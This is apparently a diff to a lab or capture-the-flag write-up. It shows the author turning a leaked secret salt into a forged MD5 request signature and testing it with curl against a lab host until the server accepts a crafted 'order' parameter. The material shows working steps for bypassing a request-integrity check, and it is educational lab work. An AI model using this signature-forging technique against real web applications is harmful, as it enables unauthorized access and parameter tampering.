@@ -82,5 +82,49 @@
 
     'SECURE_PARAM_SALT','hie0shah6ooNoim'
 
-// 
+// Lets check the hash with online hash-analyzer [tool](https://www.tunnelsup.com/hash-analyzer/)
 
+![Image 8]()
+
+// its md5 hash, we need to encrypt the salt now, we can do that with md5sum tool or online [tool](https://www.md5online.org/md5-encrypt.html)
+
+    The MD5 hash for hie0shah6ooNoim is : 9094e65be4a9dc27cd4af70674a99c64
+
+// And check the response status with curl
+
+    $ curl -I http://10.10.10.231/products-ajax.php?order=id+asc&h='9094e65be4a9dc27cd4af70674a99c64'
+-----
+
+    HTTP/1.1 500 Internal Server Error
+    Content-Length: 0
+    Content-Type: text/html; charset=UTF-8
+    Server: Microsoft-IIS/10.0
+    X-Powered-By: PHP/7.4.1
+    Date: Tue, 24 Aug 2021 19:03:47 GMT
+
+// we got status 500 (Internal Error)
+
+// After some tries it work when i encrypted the salt and add 'id acs' - "hie0shah6ooNoimid asc"
+
+    $ echo -n "hie0shah6ooNoimid asc" | md5sum
+    181345bd7fce37aad011ea65a41b60c8  -
+
+// And lets check it
+
+    $ curl -I 'http://10.10.10.231/products-ajax.php?order=id+asc&h=181345bd7fce37aad011ea65a41b60c8'
+-----
+
+    HTTP/1.1 200 OK
+    Content-Length: 0
+    Content-Type: text/html; charset=UTF-8
+    Server: Microsoft-IIS/10.0
+    X-Powered-By: PHP/7.4.1
+    Date: Tue, 24 Aug 2021 18:49:52 GMT
+
+// It worked !
+
+
+
+http://10.10.10.231/products-ajax.php?order=id+desc&h=9094e65be4a9dc27cd4af70674a99c64
+
+The MD5 hash for hie0shah6ooNoimid asc is : 181345bd7fce37aad011ea65a41b60c8
